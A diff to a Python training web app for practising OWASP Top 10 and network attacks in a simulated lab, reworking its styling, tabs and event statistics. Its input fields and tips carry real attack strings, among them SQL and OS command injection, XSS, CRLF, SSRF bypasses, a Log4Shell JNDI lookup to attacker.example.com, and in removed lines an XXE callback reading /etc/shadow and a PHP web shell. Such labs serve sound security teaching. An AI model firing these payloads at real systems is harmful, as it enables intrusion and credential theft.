@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # Lightweight Attack-and-Defense Lab
-# Covers OWASP Top 10 (2021) + selected L3-L7 attack simulations
+# Covers OWASP Top 10 + selected L3-L7 attack simulations
 # Python 3.6+ standard library only — no external dependencies
 # ---------------------------------------------------------------
 # IMPORTANT: For authorized training use only.
@@ -139,6 +139,103 @@ def read_last_log_lines(n=50):
     return [l.rstrip("\n") for l in lines[-n:]]
 
 
+ATTACK_EVENT_RULES = {
+    "sqli": {"vulnerable": {"bypass"}, "defended": set(), "benign": {"failed", "ok"}},
+    "sqli_error": {"vulnerable": {"probe"}, "defended": set(), "benign": {"ok"}},
+    "sqli_search": {"vulnerable": set(), "defended": set(), "benign": {"ok"}},
+    "cmdi": {"vulnerable": {"injection"}, "defended": set(), "benign": {"safe"}},
+    "crlfi": {"vulnerable": {"inject"}, "defended": set(), "benign": {"ok"}},
+    "idor": {"vulnerable": {"hit"}, "defended": set(), "benign": {"miss"}},
+    "jwt": {"vulnerable": {"alg_none", "weak_secret"}, "defended": set(), "benign": {"decode"}},
+    "xss": {"vulnerable": {"reflected"}, "defended": set()},
+    "xss_header": {"vulnerable": {"reflected"}, "defended": set()},
+    "lfi": {"vulnerable": {"hit"}, "defended": set(), "benign": {"miss"}},
+    "dotfile": {"vulnerable": {"exposed"}, "defended": set()},
+    "ssrf_redirect": {"vulnerable": {"bypass"}, "defended": {"blocked"}, "benign": set()},
+    "xxe": {"vulnerable": {"hit"}, "defended": set(), "benign": {"miss"}},
+    "sqli_b64": {"vulnerable": {"sqli"}, "defended": set(), "benign": {"safe", "decode_error"}},
+    "log4shell": {"vulnerable": {"jndi"}, "defended": set(), "benign": {"ok"}},
+    "ip_spoof": {"vulnerable": {"trusted"}, "defended": {"rejected"}, "benign": set()},
+    "upload": {"vulnerable": {"stored_attack"}, "defended": set(), "benign": {"stored_benign"}},
+    "portscan": {"vulnerable": {"scan"}, "defended": set(), "benign": set()},
+    "synflood": {"vulnerable": {"simulated"}, "defended": set(), "benign": set()},
+}
+
+
+def build_defense_stats():
+    stats = {
+        "ok": True,
+        "app": {
+            "log_events": 0,
+            "tracked_events": 0,
+            "ignored_events": 0,
+            "benign_events": 0,
+            "attack_events": 0,
+            "total_events": 0,
+            "vulnerable": 0,
+            "defended": 0,
+            "unknown": 0,
+            "defense_rate": 0.0,
+        },
+        "by_type": {},
+        "ignored_by_type": {},
+    }
+    if not os.path.isfile(LOG_PATH):
+        return stats
+
+    with open(LOG_PATH, "r") as fh:
+        lines = fh.readlines()
+
+    for raw in lines:
+        m = re.search(r"\btype=([^\s]+)\s+status=([^\s]+)\s+detail=", raw)
+        if not m:
+            continue
+        stats["app"]["log_events"] += 1
+        ev_type = m.group(1)
+        status = m.group(2)
+        rule = ATTACK_EVENT_RULES.get(ev_type)
+        if not rule:
+            stats["app"]["ignored_events"] += 1
+            stats["ignored_by_type"][ev_type] = stats["ignored_by_type"].get(ev_type, 0) + 1
+            continue
+
+        stats["app"]["tracked_events"] += 1
+        stats["app"]["total_events"] += 1
+        bucket = stats["by_type"].setdefault(ev_type, {
+            "total": 0,
+            "vulnerable": 0,
+            "defended": 0,
+            "benign": 0,
+            "unknown": 0,
+        })
+        bucket["total"] += 1
+
+        benign_set = rule.get("benign", set())
+        if status in benign_set:
+            stats["app"]["benign_events"] += 1
+            bucket["benign"] += 1
+            continue
+
+        stats["app"]["attack_events"] += 1
+        if status in rule["vulnerable"]:
+            stats["app"]["total_events"] += 1
+            stats["app"]["vulnerable"] += 1
+            bucket["vulnerable"] += 1
+        elif status in rule["defended"]:
+            stats["app"]["total_events"] += 1
+            stats["app"]["defended"] += 1
+            bucket["defended"] += 1
+        else:
+            stats["app"]["total_events"] += 1
+            stats["app"]["unknown"] += 1
+            bucket["unknown"] += 1
+
+    decided = stats["app"]["vulnerable"] + stats["app"]["defended"]
+    if decided > 0:
+        stats["app"]["defense_rate"] = round((stats["app"]["defended"] * 100.0) / decided, 2)
+    return stats
+
+
 # ---------------------------------------------------------------------------
 # Multipart file upload parser (no cgi module)
 # ---------------------------------------------------------------------------
@@ -186,61 +283,209 @@ HTML_CONTENT = """<!DOCTYPE html>
 <title>Attack &amp; Defense Lab</title>
 <style>
 :root{
-  --bg:#eaf3ff;--surface:#fff;--line:#d2dfe8;
-  --text:#1e2b37;--muted:#5c697a;
-  --blue:#246fdb;--blue-d:#1c56ab;
-  --green:#1b9774;--red:#c23b31;--amber:#c07c10;
-  --sh:0 8px 22px rgba(20,60,100,.12);
+    --bg0:#04121f;--bg1:#081a2e;--bg2:#0b233c;
+    --surface:#0f1f33;--surface2:#122843;--line:#1f4668;
+    --text:#d9f4ff;--muted:#8db5c8;
+    --blue:#1aa4ff;--blue-d:#1177c9;
+    --green:#18d6b2;--red:#ff5f78;--amber:#ffc857;
+    --glow:0 0 0 1px rgba(26,164,255,.35),0 0 20px rgba(26,164,255,.15);
+    --sh:0 14px 34px rgba(0,0,0,.38);
 }
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:"Segoe UI",Tahoma,Arial,sans-serif;background:linear-gradient(160deg,#e9f4ff 0%,#e8f8f1 50%,#f5f9f7 100%);color:var(--text);line-height:1.5}
+body{
+    font-family:"Trebuchet MS","Verdana","Tahoma",sans-serif;
+    background:
+        radial-gradient(1200px 600px at 10% -10%,rgba(24,214,178,.14),transparent 60%),
+        radial-gradient(1000px 700px at 100% 0%,rgba(26,164,255,.22),transparent 62%),
+        linear-gradient(150deg,var(--bg0) 0%,var(--bg1) 45%,var(--bg2) 100%);
+    color:var(--text);
+    line-height:1.5;
+    min-height:100vh;
+    position:relative;
+    overflow-x:hidden;
+}
+body:before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    opacity:.2;
+    background-image:
+        linear-gradient(rgba(26,164,255,.22) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(26,164,255,.16) 1px,transparent 1px);
+    background-size:30px 30px,30px 30px;
+    animation:gridDrift 16s linear infinite;
+}
+body:after{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    opacity:.11;
+    background:repeating-linear-gradient(
+        180deg,
+        rgba(120,220,255,.16) 0px,
+        rgba(120,220,255,.16) 1px,
+        transparent 2px,
+        transparent 4px
+    );
+    animation:scanlineDrift 7s linear infinite;
+}
 .wrap{max-width:1300px;margin:0 auto;padding:20px}
-.hero{background:var(--surface);border:1px solid var(--line);border-radius:14px;box-shadow:var(--sh);padding:20px;margin-bottom:16px}
-h1{color:#184976;font-size:26px;margin-bottom:6px}
+.hero{
+    background:linear-gradient(160deg,rgba(15,31,51,.95),rgba(18,40,67,.93));
+    border:1px solid var(--line);
+    border-radius:14px;
+    box-shadow:var(--sh),var(--glow);
+    padding:20px;
+    margin-bottom:16px;
+    position:relative;
+    overflow:hidden;
+}
+.hero:after{
+    content:"";
+    position:absolute;
+    top:-40%;
+    right:-20%;
+    width:260px;
+    height:260px;
+    border-radius:50%;
+    background:radial-gradient(circle,rgba(26,164,255,.25),transparent 70%);
+}
+.status-strip{
+    margin-top:10px;
+    display:flex;
+    flex-wrap:wrap;
+    gap:8px;
+}
+.status-pill{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    font-size:11px;
+    letter-spacing:.2px;
+    color:#9fd4ea;
+    border:1px solid #275679;
+    border-radius:999px;
+    padding:4px 10px;
+    background:rgba(6,22,38,.6);
+}
+.status-dot{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#8aa8ba;
+    box-shadow:0 0 0 1px rgba(255,255,255,.08);
+}
+.status-dot.ok{background:#18d6b2;box-shadow:0 0 10px rgba(24,214,178,.65)}
+.status-dot.warn{background:#ffc857;box-shadow:0 0 10px rgba(255,200,87,.5)}
+.status-dot.pulse{animation:lampPulse 1.8s ease-in-out infinite}
+h1{color:#b8ecff;font-size:26px;margin-bottom:6px;letter-spacing:.3px;text-shadow:0 0 18px rgba(26,164,255,.25)}
 .sub{color:var(--muted);font-size:13px}
-h3{color:#1e4f83;font-size:15px;margin-bottom:8px}
+h3{color:#9cdef8;font-size:15px;margin-bottom:8px}
 .tabs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}
-.tab{padding:7px 14px;border:1px solid var(--blue);border-radius:20px;background:#fff;color:var(--blue);cursor:pointer;font-size:13px;font-weight:600}
-.tab.active,.tab:hover{background:var(--blue);color:#fff}
+.tab{
+    padding:7px 14px;
+    border:1px solid rgba(26,164,255,.55);
+    border-radius:20px;
+    background:rgba(11,35,60,.72);
+    color:#8ed7ff;
+    cursor:pointer;
+    font-size:13px;
+    font-weight:600;
+    transition:all .2s ease;
+}
+.tab.active,.tab:hover{background:linear-gradient(180deg,var(--blue) 0%,var(--blue-d) 100%);color:#fff;box-shadow:0 0 16px rgba(26,164,255,.35)}
 .section{display:none}.section.active{display:block}
 .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
-.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;box-shadow:var(--sh);padding:16px}
+.card{
+    background:linear-gradient(160deg,var(--surface),var(--surface2));
+    border:1px solid var(--line);
+    border-radius:12px;
+    box-shadow:var(--sh);
+    padding:16px;
+    transition:transform .18s ease,border-color .18s ease,box-shadow .18s ease;
+}
+.card:hover{transform:translateY(-2px);border-color:rgba(26,164,255,.65);box-shadow:var(--sh),var(--glow)}
 .tip{color:var(--muted);font-size:12px;margin-bottom:10px}
-.tip code{background:#ecf2f7;padding:1px 4px;border-radius:3px;font-family:Consolas,monospace;font-size:12px}
+.tip code{background:rgba(16,62,96,.55);color:#c8f2ff;padding:1px 4px;border-radius:3px;font-family:"Liberation Mono","Consolas",monospace;font-size:12px}
 label{display:block;font-size:12px;font-weight:600;color:#2b4152;margin:8px 0 3px}
-input,textarea,select{width:100%;border:1px solid #bfcfdb;border-radius:7px;padding:8px;font-size:13px;background:#fcfefe;color:var(--text)}
+label{color:#7cc0dc}
+input,textarea,select{
+    width:100%;
+    border:1px solid #356488;
+    border-radius:7px;
+    padding:8px;
+    font-size:13px;
+    background:#0a1a2d;
+    color:var(--text);
+}
+input:focus,textarea:focus,select:focus{outline:none;border-color:#43c7ff;box-shadow:0 0 0 2px rgba(26,164,255,.2)}
 textarea{resize:vertical;min-height:60px}
-.btn{margin-top:10px;width:100%;border:none;border-radius:7px;padding:9px;color:#fff;font-weight:700;cursor:pointer;font-size:13px;background:linear-gradient(180deg,var(--blue) 0%,var(--blue-d) 100%)}
-.btn:hover{filter:brightness(.93)}
+.btn{margin-top:10px;width:100%;border:none;border-radius:7px;padding:9px;color:#fff;font-weight:700;cursor:pointer;font-size:13px;background:linear-gradient(180deg,var(--blue) 0%,var(--blue-d) 100%);transition:transform .14s ease,filter .14s ease,box-shadow .14s ease}
+.btn:hover{filter:brightness(1.04);transform:translateY(-1px);box-shadow:0 0 16px rgba(26,164,255,.3)}
 .btn-sm{padding:6px 10px;width:auto;margin-top:0;font-size:12px;border-radius:6px;border:none;color:#fff;cursor:pointer;background:var(--blue-d)}
-.result{margin-top:10px;min-height:70px;border:1px solid #c8d6e0;border-radius:8px;background:#f7fbfd;padding:10px;font-size:12px;white-space:pre-wrap;overflow-wrap:break-word;font-family:Consolas,monospace}
+.result{margin-top:10px;min-height:70px;border:1px solid #2a597e;border-radius:8px;background:#081a2d;padding:10px;font-size:12px;white-space:pre-wrap;overflow-wrap:break-word;font-family:"Liberation Mono","Consolas",monospace;color:#d9f4ff}
 .ok{color:var(--green);font-weight:700}
 .warn{color:var(--red);font-weight:700}
 .info{color:var(--amber);font-weight:700}
 .badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 6px;border-radius:10px;margin-left:6px;vertical-align:middle}
-.badge-red{background:#fde8e8;color:var(--red)}
-.log-box{background:#0e1f2e;color:#a8d8a8;border-radius:8px;padding:12px;font-size:11px;min-height:100px;white-space:pre-wrap;font-family:Consolas,monospace;overflow-y:auto;max-height:280px}
+.badge-red{background:rgba(255,95,120,.18);color:#ffb0bf;border:1px solid rgba(255,95,120,.35)}
+.log-box{background:#051525;color:#87ffd8;border:1px solid #2d5c7f;border-radius:8px;padding:12px;font-size:11px;min-height:100px;white-space:pre-wrap;font-family:"Liberation Mono","Consolas",monospace;overflow-y:auto;max-height:280px;position:relative}
+.log-box:after{content:"_";position:absolute;right:10px;bottom:8px;color:#87ffd8;opacity:.9;animation:cursorBlink 1s steps(1,end) infinite;pointer-events:none}
+.defense-viz{display:flex;flex-wrap:wrap;gap:14px;align-items:center;margin-bottom:12px;padding:10px;border:1px solid #2a597e;border-radius:8px;background:#081a2d}
+.pie3d{--pct:0;position:relative;width:140px;height:140px;border-radius:50%;background:conic-gradient(#18d6b2 calc(var(--pct)*1%), #ff5f78 0);box-shadow:0 10px 18px rgba(0,0,0,.35), inset 0 2px 10px rgba(255,255,255,.1)}
+.pie3d:before{content:"";position:absolute;left:8px;right:8px;top:8px;bottom:8px;border-radius:50%;background:#071726;box-shadow:inset 0 0 0 1px rgba(31,70,104,.7)}
+.pie3d-center{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;color:#b8ecff;text-shadow:0 0 10px rgba(26,164,255,.35)}
+.viz-legend{font-size:12px;line-height:1.6;color:#9fd4ea}
 footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
+@keyframes gridDrift{
+    0%{transform:translate3d(0,0,0)}
+    100%{transform:translate3d(30px,30px,0)}
+}
+@keyframes scanlineDrift{
+    0%{transform:translateY(0)}
+    100%{transform:translateY(8px)}
+}
+@keyframes lampPulse{
+    0%,100%{transform:scale(1);filter:brightness(1)}
+    50%{transform:scale(1.12);filter:brightness(1.2)}
+}
+@keyframes cursorBlink{
+    0%,49%{opacity:1}
+    50%,100%{opacity:0}
+}
+@media (max-width: 700px){
+    .wrap{padding:12px}
+    .tabs{gap:5px}
+    .tab{font-size:12px;padding:6px 10px}
+    .status-strip{gap:6px}
+    .status-pill{font-size:10px;padding:3px 8px}
+}
 </style>
 </head>
 <body>
 <div class="wrap">
 <div class="hero">
   <h1>Attack &amp; Defense Lab <span class="badge badge-red">Huawei Cloud Security PoC Only - Author: Jason Gao</span></h1>
-  <p class="sub">OWASP Top 10 (2021) + L3-L7 attack simulation. All sensitive files are synthetic under <code>./lab_files</code>. No real system data is read or executed.</p>
+    <p class="sub">OWASP Top 10 attack paths + L3-L7 network security simulations. All sensitive files are synthetic under <code>./lab_files</code>; no real system data is read or executed.</p>
+    <div class="status-strip">
+        <span class="status-pill"><span class="status-dot ok pulse"></span>LAB ONLINE</span>
+        <span class="status-pill"><span class="status-dot warn pulse"></span>SIMULATION MODE</span>
+        <span class="status-pill"><span class="status-dot ok"></span>NO EXTERNAL DEPENDENCIES</span>
+    </div>
 </div>
 <div class="tabs">
-  <div class="tab active" onclick="switchTab('injection')">Injection (A03)</div>
-  <div class="tab" onclick="switchTab('authz')">Auth/AuthZ (A01/A07)</div>
-  <div class="tab" onclick="switchTab('xss')">XSS (A03)</div>
-  <div class="tab" onclick="switchTab('lfi')">LFI/Traversal (A01)</div>
-  <div class="tab" onclick="switchTab('ssrf')">SSRF (A10)</div>
-  <div class="tab" onclick="switchTab('xxe')">XXE (A05)</div>
-  <div class="tab" onclick="switchTab('deser')">Insecure Deser (A08)</div>
-  <div class="tab" onclick="switchTab('misconfig')">Misconfig (A05)</div>
-  <div class="tab" onclick="switchTab('upload')">Upload/Malware</div>
-  <div class="tab" onclick="switchTab('network')">L3-L4 Network</div>
-  <div class="tab" onclick="switchTab('logs')">Event Logs</div>
+    <div class="tab active" data-tab="injection" data-label="Injection (A03)" onclick="switchTab('injection')">Injection (A03)</div>
+    <div class="tab" data-tab="xss" data-label="XSS (A03)" onclick="switchTab('xss')">XSS (A03)</div>
+    <div class="tab" data-tab="upload" data-label="Upload" onclick="switchTab('upload')">Upload</div>
+    <div class="tab" data-tab="authz" data-label="Auth &amp; Access (A01/A07)" onclick="switchTab('authz')">Auth &amp; Access (A01/A07)</div>
+    <div class="tab" data-tab="lfi" data-label="File Access (A01/A05)" onclick="switchTab('lfi')">File Access (A01/A05)</div>
+    <div class="tab" data-tab="ssrf" data-label="SSRF Redirect (A10)" onclick="switchTab('ssrf')">SSRF Redirect (A10)</div>
+    <div class="tab" data-tab="xxe" data-label="XXE (A05)" onclick="switchTab('xxe')">XXE (A05)</div>
+    <div class="tab" data-tab="deser" data-label="Integrity (A08/A06)" onclick="switchTab('deser')">Integrity (A08/A06)</div>
+    <div class="tab" data-tab="network" data-label="Network (L3-L4)" onclick="switchTab('network')">Network (L3-L4)</div>
+    <div class="tab" data-tab="logs" data-label="Logs" onclick="switchTab('logs')">Logs</div>
 </div>
 
 <!-- INJECTION -->
@@ -259,31 +504,11 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <button class="btn" onclick="api('sqli2','sqli2-out',{q:g('sqli2-q')})">Search</button>
 <div id="sqli2-out" class="result"></div></div>
 
-<div class="card"><h3>A03 &mdash; NoSQL Injection</h3>
-<p class="tip">Operator: <code>{"$gt":""}</code> | <code>{"$ne":"invalid"}</code></p>
-<label>Username (JSON or plain)</label><input id="nosql-u" value='{"$gt":""}'>
-<label>Password</label><input id="nosql-p" value="anything">
-<button class="btn" onclick="api('nosqli','nosql-out',{username:g('nosql-u'),password:g('nosql-p')})">Send</button>
-<div id="nosql-out" class="result"></div></div>
-
 <div class="card"><h3>A03 &mdash; OS Command Injection</h3>
 <p class="tip">Chain: <code>127.0.0.1; cat /etc/passwd</code> | Pipe: <code>127.0.0.1 | id</code> | Backtick: <code>`whoami`</code></p>
 <label>Host</label><input id="cmdi-h" value="127.0.0.1">
 <button class="btn" onclick="api('cmdi','cmdi-out',{host:g('cmdi-h')})">Ping</button>
 <div id="cmdi-out" class="result"></div></div>
-
-<div class="card"><h3>A03 &mdash; LDAP Injection</h3>
-<p class="tip">Bypass: <code>*)(uid=*</code> | <code>admin)(&amp;</code></p>
-<label>Username</label><input id="ldap-u" value="*)(uid=*">
-<label>Password</label><input id="ldap-p" value="anything">
-<button class="btn" onclick="api('ldapi','ldap-out',{username:g('ldap-u'),password:g('ldap-p')})">Send</button>
-<div id="ldap-out" class="result"></div></div>
-
-<div class="card"><h3>A03 &mdash; SSTI (Template Injection)</h3>
-<p class="tip">Jinja2: <code>{{7*7}}</code> | <code>{{config.items()}}</code> | <code>{{''.__class__.__mro__}}</code></p>
-<label>Template Input</label><input id="ssti-i" value="{{7*7}}">
-<button class="btn" onclick="api('ssti','ssti-out',{input:g('ssti-i')})">Render</button>
-<div id="ssti-out" class="result"></div></div>
 
 <div class="card"><h3>A03 &mdash; CRLF / Header Injection</h3>
 <p class="tip">Inject: <code>normal%0d%0aSet-Cookie:%20session=hijacked</code></p>
@@ -322,35 +547,6 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <button class="btn" onclick="api('jwt','jwt-out',{token:g('jwt-token'),attack:g('jwt-attack')})">Attack</button>
 <div id="jwt-out" class="result"></div></div>
 
-<div class="card"><h3>A01 &mdash; Privilege Escalation</h3>
-<p class="tip">Change role from <code>viewer</code> to <code>administrator</code> in the request.</p>
-<label>Claimed Role</label>
-<select id="priv-role">
-  <option value="viewer">viewer</option>
-  <option value="analyst">analyst</option>
-  <option value="administrator">administrator</option>
-</select>
-<button class="btn" onclick="api('privesc','priv-out',{role:g('priv-role')})">Access Admin</button>
-<div id="priv-out" class="result"></div></div>
-
-<div class="card"><h3>A02 &mdash; Weak Cryptography</h3>
-<p class="tip">MD5 / SHA-1 are broken. <code>5f4dcc3b5aa765d61d8327deb882cf99</code> = <em>password</em></p>
-<label>Password</label><input id="crypto-p" value="password">
-<label>Algorithm</label>
-<select id="crypto-alg">
-  <option value="md5">MD5 (broken)</option>
-  <option value="sha1">SHA-1 (deprecated)</option>
-  <option value="sha256">SHA-256 (ok)</option>
-  <option value="bcrypt_sim">bcrypt (simulated)</option>
-</select>
-<button class="btn" onclick="api('weakcrypto','crypto-out',{password:g('crypto-p'),alg:g('crypto-alg')})">Hash</button>
-<div id="crypto-out" class="result"></div></div>
-
-<div class="card"><h3>A09 &mdash; Log Forging</h3>
-<p class="tip">Inject CRLF to forge log entries: <code>normal%0atype=auth status=ok detail=injected</code></p>
-<label>Log Message</label><input id="logf-m" value="normal%0atype=auth status=ok detail=injected">
-<button class="btn" onclick="api('logforge','logf-out',{msg:g('logf-m')})">Inject Log</button>
-<div id="logf-out" class="result"></div></div>
 </div></div>
 
 <!-- XSS -->
@@ -361,19 +557,6 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <label>Input</label><input id="rxss-i" value="&lt;img src=x onerror=alert('rxss')&gt;">
 <button class="btn" onclick="reflectedXSS()">Reflect</button>
 <div id="rxss-out" class="result"></div></div>
-
-<div class="card"><h3>A03 &mdash; Stored XSS (Comment Board)</h3>
-<p class="tip">Post comment; rendered via innerHTML (client-side demo, no backend request). Try <code>&lt;script&gt;alert('stored')&lt;/script&gt;</code></p>
-<label>Comment</label><input id="sxss-i" value="Hello from &lt;b&gt;Bob&lt;/b&gt;">
-<button class="btn" onclick="postComment()">Post Comment</button>
-<button class="btn" style="margin-top:6px;background:var(--blue-d)" onclick="loadComments()">View Board</button>
-<div id="sxss-out" class="result"></div></div>
-
-<div class="card"><h3>A03 &mdash; DOM-Based XSS</h3>
-<p class="tip">Inject into DOM via innerHTML (client-side demo, no backend request). Add <code>#&lt;img src=x onerror=alert('dom')&gt;</code> to URL or use input.</p>
-<label>Fragment value</label><input id="dxss-i" value="&lt;img src=x onerror=alert('dom')&gt;">
-<button class="btn" onclick="domXSS()">Inject DOM</button>
-<div id="dxss-out" class="result"></div></div>
 
 <div class="card"><h3>A03 &mdash; XSS via HTTP Header</h3>
 <p class="tip">Server reflects X-Custom-Name header without escaping.</p>
@@ -391,12 +574,6 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <button class="btn" onclick="api('lfi','lfi-out',{target:g('lfi-t')})">Request</button>
 <div id="lfi-out" class="result"></div></div>
 
-<div class="card"><h3>A01 &mdash; Directory Listing Exposure</h3>
-<p class="tip">Browse directories: <code>/</code> | <code>/lab_files</code> | <code>/uploads</code></p>
-<label>Directory Path</label><input id="dirlist-p" value="/lab_files">
-<button class="btn" onclick="api('dirlist','dirlist-out',{path:g('dirlist-p')})">List</button>
-<div id="dirlist-out" class="result"></div></div>
-
 <div class="card"><h3>A05 &mdash; Backup / Dot-File Disclosure</h3>
 <p class="tip">Targets: <code>.env</code> | <code>.git/config</code> | <code>web.config.bak</code> | <code>app.config.bak</code></p>
 <label>File</label><input id="dot-f" value=".env">
@@ -407,12 +584,6 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <!-- SSRF -->
 <div class="section" id="sec-ssrf">
 <div class="grid">
-<div class="card"><h3>A10 &mdash; SSRF (Internal Host Probe)</h3>
-<p class="tip"><code>169.254.169.254</code> AWS IMDS | <code>127.0.0.1</code> internal API | <code>192.168.0.1</code> router | <code>10.0.0.1</code> gateway</p>
-<label>Target Host / URL</label><input id="ssrf-u" value="169.254.169.254">
-<button class="btn" onclick="api('ssrf','ssrf-out',{url:g('ssrf-u')})">Send Request</button>
-<div id="ssrf-out" class="result"></div></div>
-
 <div class="card"><h3>A10 &mdash; SSRF via Open Redirect</h3>
 <p class="tip">IP bypass wrappers: <code>http://0x7f000001/</code> | <code>http://127.1/</code> | <code>http://[::1]/</code></p>
 <label>Redirect-To URL</label><input id="ssrf2-u" value="http://127.0.0.1/admin">
@@ -432,34 +603,21 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <button class="btn" onclick="api('xxe','xxe-out',{xml:g('xxe-xml')})">Parse XML</button>
 <div id="xxe-out" class="result"></div></div>
 
-<div class="card"><h3>A05 &mdash; XXE Blind OOB</h3>
-<p class="tip">Out-of-band exfiltration via external DTD callback (simulated).</p>
-<label>OOB Callback Host</label><input id="xxe2-h" value="attacker.example.com">
-<label>File</label>
-<select id="xxe2-f">
-  <option value="passwd">/etc/passwd</option>
-  <option value="shadow">/etc/shadow</option>
-  <option value="env">app/.env</option>
-  <option value="id_rsa">id_rsa</option>
-</select>
-<button class="btn" onclick="api('xxe_blind','xxe2-out',{host:g('xxe2-h'),file:g('xxe2-f')})">Trigger OOB</button>
-<div id="xxe2-out" class="result"></div></div>
 </div></div>
 
 <!-- DESER -->
 <div class="section" id="sec-deser">
 <div class="grid">
-<div class="card"><h3>A08 &mdash; Insecure Deserialization</h3>
-<p class="tip">Gadget keywords: <code>__reduce__</code> <code>subprocess</code> <code>os.system</code> <code>exec</code><br>Safe example (JSON b64): <code>eyJ1c2VyIjogImFkbWluIn0=</code></p>
-<label>Serialized Payload (Base64)</label>
-<textarea id="deser-d">eyJ1c2VyIjogImFkbWluIn0=</textarea>
-<label>Format</label>
-<select id="deser-f">
-  <option value="json">JSON</option>
-  <option value="pickle_sim">Python pickle (simulated)</option>
-  <option value="java_sim">Java object (simulated)</option>
-</select>
-<button class="btn" onclick="api('deser','deser-out',{data:g('deser-d'),format:g('deser-f')})">Deserialize</button>
+<div class="card"><h3>A03 &mdash; Base64 SQL Injection (UNION)</h3>
+<p class="tip">Encode SQLi payload to test naive filter bypasses.<br>Example payload: <code>' UNION SELECT 1,username,password FROM users--</code><br>Base64 sample: <code>JyBVTklPTiBTRUxFQ1QgMSx1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzLS0=</code></p>
+<label>Plain SQLi Payload</label>
+<textarea id="deser-plain">' UNION SELECT 1,username,password FROM users--</textarea>
+<label>Base64 Payload</label>
+<textarea id="deser-d">JyBVTklPTiBTRUxFQ1QgMSx1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzLS0=</textarea>
+<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
+<button class="btn-sm" onclick="encodeAndTest()">Encode &amp; Test</button>
+<button class="btn-sm" onclick="api('deser','deser-out',{payload:g('deser-d')})">Decode &amp; Test</button>
+</div>
 <div id="deser-out" class="result"></div></div>
 
 <div class="card"><h3>A06 &mdash; Log4Shell Simulation (CVE-2021-44228)</h3>
@@ -468,46 +626,6 @@ footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
 <input id="log4j-i" value="${jndi:ldap://attacker.example.com/a}">
 <button class="btn" onclick="api('log4shell','log4j-out',{input:g('log4j-i')})">Send</button>
 <div id="log4j-out" class="result"></div></div>
-</div></div>
-
-<!-- MISCONFIG -->
-<div class="section" id="sec-misconfig">
-<div class="grid">
-<div class="card"><h3>A05 &mdash; Exposed Debug Endpoint</h3>
-<p class="tip">Common paths: <code>/debug</code> <code>/_debug</code> <code>/console</code> <code>/actuator/env</code></p>
-<label>Path</label><input id="debug-p" value="/debug">
-<button class="btn" onclick="api('debugpath','debug-out',{path:g('debug-p')})">Probe</button>
-<div id="debug-out" class="result"></div></div>
-
-<div class="card"><h3>A05 &mdash; Default / Weak Credentials</h3>
-<p class="tip">Try: admin/admin, admin/password, root/root, guest/guest</p>
-<label>Username</label><input id="defcred-u" value="admin">
-<label>Password</label><input id="defcred-p" value="admin">
-<button class="btn" onclick="api('defcred','defcred-out',{username:g('defcred-u'),password:g('defcred-p')})">Login</button>
-<div id="defcred-out" class="result"></div></div>
-
-<div class="card"><h3>A05 &mdash; HTTP Method Tampering</h3>
-<p class="tip">Blocked methods: <code>TRACE</code> <code>OPTIONS</code> <code>PUT</code> <code>DELETE</code></p>
-<label>Method</label>
-<select id="method-m">
-  <option>TRACE</option><option>OPTIONS</option><option>PUT</option>
-  <option>DELETE</option><option>CONNECT</option>
-</select>
-<label>Path</label><input id="method-p" value="/api/sqli">
-<button class="btn" onclick="api('method_tamper','method-out',{method:g('method-m'),path:g('method-p')})">Send</button>
-<div id="method-out" class="result"></div></div>
-
-<div class="card"><h3>A04 &mdash; File IDOR (Report Enumeration)</h3>
-<p class="tip">Try IDs: <code>1</code> <code>2</code> <code>99</code> or traversal: <code>../etc/passwd</code></p>
-<label>Report ID</label><input id="fidor-id" value="2">
-<button class="btn" onclick="api('file_idor','fidor-out',{id:g('fidor-id')})">Download Report</button>
-<div id="fidor-out" class="result"></div></div>
-
-<div class="card"><h3>A05 &mdash; Verbose Error / Stack Trace</h3>
-<p class="tip">Special chars trigger full traceback disclosure.</p>
-<label>Input</label><input id="err-i" value="{{bad_obj}}">
-<button class="btn" onclick="api('verbose_error','err-out',{input:g('err-i')})">Trigger Error</button>
-<div id="err-out" class="result"></div></div>
 </div></div>
 
 <!-- UPLOAD -->
@@ -529,19 +647,6 @@ For NGFW compatibility, no EICAR string is pre-rendered in this page.</p>
 <button class="btn" onclick="uploadFile()">Upload</button>
 <div id="upl-out" class="result"></div></div>
 
-<div class="card"><h3>A08 &mdash; Polyglot File Upload</h3>
-<p class="tip">File valid as both image and script (polyglot technique).</p>
-<label>Filename</label><input id="poly-fn" value="evil.jpg.php">
-<label>Content-Type</label>
-<select id="poly-ct">
-  <option value="image/jpeg">image/jpeg</option>
-  <option value="image/png">image/png</option>
-  <option value="application/pdf">application/pdf</option>
-</select>
-<label>Payload description</label>
-<input id="poly-pl" value="GIF89a&lt;?php system($_GET[cmd]); ?&gt;">
-<button class="btn" onclick="api('polyglot','poly-out',{filename:g('poly-fn'),ct:g('poly-ct'),payload:g('poly-pl')})">Simulate Upload</button>
-<div id="poly-out" class="result"></div></div>
 </div></div>
 
 <!-- NETWORK -->
@@ -576,27 +681,23 @@ For NGFW compatibility, no EICAR string is pre-rendered in this page.</p>
 <button class="btn" onclick="httpFlood()">Start Flood</button>
 <div id="flood-out" class="result"></div></div>
 
